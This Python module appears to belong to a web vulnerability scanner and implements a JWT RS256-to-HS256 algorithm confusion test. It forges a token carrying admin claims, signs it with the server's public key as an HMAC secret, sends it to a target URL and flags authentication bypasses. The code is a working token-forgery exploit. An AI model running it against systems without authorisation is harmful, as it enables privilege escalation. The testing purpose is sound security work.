"""RS256->HS256 algorithm confusion attack."""

import base64
import json
import logging
from typing import Any

from .jwt_attack_helpers import (
    JWT_AUTH_HEADERS,
    _create_jwt,
    _decode_jwt_part,
    _get_original_status,
    _send_with_token,
)

logger = logging.getLogger(__name__)


def _extract_public_key_from_x5c(header: dict) -> bytes | None:
    """Extract public key from x5c header (X.509 Certificate Chain)."""
    x5c = header.get("x5c")
    if not x5c or not isinstance(x5c, list) or len(x5c) == 0:
        return None
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import serialization

        cert_der = base64.b64decode(x5c[0])
        cert = x509.load_der_x509_certificate(cert_der)
        public_key = cert.public_key()
        return public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    except Exception as e:
        logger.debug("Failed to extract public key from x5c: %s", e)
        return None


def _extract_public_key_from_jku(header: dict, session: Any) -> bytes | None:
    """Extract public key from JKU (JWK Set URL) header."""
    jku = header.get("jku")
    if not jku or not isinstance(jku, str):
        return None
    try:
        if hasattr(session, "get"):
            resp = session.get(jku, timeout=10, verify=True)
            jwks = resp.json()
        else:
            from src.analysis._core.http_request import _safe_request

            resp = _safe_request(jku, timeout=10)
            jwks = json.loads(resp.get("body", "{}"))
        keys = jwks.get("keys", [])
        for key in keys:
            if key.get("kty") == "RSA" and key.get("use") in ("sig", None):
                from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
                from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

                n = int.from_bytes(
                    base64.urlsafe_b64decode(key["n"] + "=" * (-len(key["n"]) % 4)), "big"
                )
                e = int.from_bytes(
                    base64.urlsafe_b64decode(key["e"] + "=" * (-len(key["e"]) % 4)), "big"
                )
                pub_numbers = RSAPublicNumbers(e, n)
                pub_key = pub_numbers.public_key()
                return pub_key.public_bytes(
                    encoding=Encoding.PEM,
                    format=PublicFormat.SubjectPublicKeyInfo,
                )
    except Exception as e:
        logger.debug("Failed to extract public key from JKU %s: %s", jku, e)
    return None


def _extract_public_key(header: dict, session: Any) -> bytes | None:
    """Try to extract public key from token headers (x5c or jku)."""
    key = _extract_public_key_from_x5c(header)
    if key:
        return key
    key = _extract_public_key_from_jku(header, session)
    if key:
        return key
    return None


def test_algorithm_confusion(token: str, url: str, session: Any) -> dict[str, Any]:
    """Test RS256->HS256 algorithm confusion.

    If the original token uses RS256, re-sign it with HS256 using the
    public key as the HMAC secret, which some servers mistakenly accept.
    """
    result: dict[str, Any] = {"attack": "algorithm_confusion", "vulnerable": False, "details": []}
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return result
        header = _decode_jwt_part(parts[0])
        payload = _decode_jwt_part(parts[1])
        if not header or not payload:
            return result

        if not isinstance(header, dict) or header.get("alg", "").upper() != "RS256":
            result["skipped"] = True
            result["reason"] = "Token does not use RS256"
            return result

        modified_payload = dict(payload)
        modified_payload["admin"] = True
        modified_payload["role"] = "admin"
        modified_payload["is_admin"] = True

        public_key = _extract_public_key(header, session)
        if not public_key:
            result["skipped"] = True
            result["reason"] = "Could not extract public key for algorithm confusion test"
            return result

        confusion_token = _create_jwt(
            {"alg": "HS256", "typ": "JWT"},
            modified_payload,
            secret=public_key,
        )

        original_status = _get_original_status(url, session)

        for auth_header in JWT_AUTH_HEADERS:
            resp = _send_with_token(url, confusion_token, auth_header, session)
            status = resp.get("status", 0)

            if status in (200, 302) and original_status in (401, 403):
                result["vulnerable"] = True
                result["details"].append(
                    {
                        "auth_header": auth_header,
                        "status_code": status,
                        "original_status": original_status,
                        "finding": "alg_confusion_rs256_to_hs256_bypass",
                    }
                )
                break

        logger.info("Algorithm confusion test on %s: vulnerable=%s", url, result["vulnerable"])
    except Exception as e:
        logger.error("Algorithm confusion test error on %s: %s", url, e)
    return result
